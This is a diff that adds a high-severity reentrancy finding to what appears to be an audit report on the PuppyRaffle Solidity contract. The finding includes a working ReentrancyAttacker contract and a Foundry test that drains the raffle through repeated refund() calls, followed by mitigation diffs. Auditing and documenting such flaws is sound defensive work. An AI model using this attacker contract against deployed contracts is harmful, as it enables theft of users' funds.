@@ -103,3 +103,112 @@ Place the following test into `PuppleRaffleTest.t.sol`
         require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
 ```
 Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).
+
+### [H-1] Reentrancy Vulnerability in refund() Function (Improper State Update Order + External Call Before State Change)
+
+**Description:** The refund() function in the PuppyRaffle contract performs an external call to payable(msg.sender).sendValue(entranceFee) before updating the contract’s internal state (players[playerIndex] = address(0)).
+This allows a malicious player to exploit reentrancy by triggering the refund() function multiple times through a fallback or receive() function, draining multiple refunds before the player’s entry is cleared from the players array.
+
+```javascript
+@>    //audit reentrancy attack, the contracts sends eth before removing the player, add nonreentranct from openzeppelin
+    payable(msg.sender).sendValue(entranceFee);
+
+    players[playerIndex] = address(0);
+```
+
+**Impact:**  A malicious user could repeatedly trigger the refund process to receive multiple refunds for a single entry, leading to a loss of contract funds and denial of service for other legitimate players.
+
+**Proof of Concept:**
+
+- Attacker joins the raffle as a player.
+- The attacker deploys a malicious contract with a fallback/receive function that calls refund() again upon receiving Ether.
+- When the attacker calls refund(), the external call to sendValue() triggers the fallback and recursively calls refund() before the players[playerIndex] value is set to address(0).
+- The attacker can drain the raffle funds through repeated refunds.
+
+Add the following to `PuppleRaffleTest.t.sol` test file
+
+<details>
+<summary>Code</summary>
+
+```javascript
+function testReentrancyAttackRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(puppyRaffle);
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(reentrancyAttacker).balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackerUser);
+        reentrancyAttacker.attack{value: entranceFee}();
+
+        console2.log("starting attacker contract balance:", startingAttackContractBalance);
+        console2.log("starting pupple raffle contract balance:", startingPuppyRaffleBalance);
+
+        console2.log("ending attacker contract balance:", address(reentrancyAttacker).balance);
+        console2.log("ending puppy raffle contract balance:", address(puppyRaffle).balance);
+    }
+
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 indexOfAttacker;
+
+    constructor(PuppyRaffle _puppleRaffle) {
+        puppyRaffle = _puppleRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        indexOfAttacker = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(indexOfAttacker);
+    }
+    
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(indexOfAttacker);
+        }
+    }
+    fallback() external payable {
+        _stealMoney();
+    }
+    receive() external payable {
+        _stealMoney();
+    }
+}
+```
+
+</details>
+
+**Recommended Mitigation:** 
+
+- Update the contract’s state before performing external calls:
+
+```diff
+-  payable(msg.sender).sendValue(entranceFee);
+-  players[playerIndex] = address(0);
+```
+
+```diff
++ players[playerIndex] = address(0);
++ payable(msg.sender).sendValue(entranceFee);
+```
+
+- Apply the nonReentrant modifier from OpenZeppelin’s ReentrancyGuard to prevent nested calls.
+
+```diff
++ import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+```
+
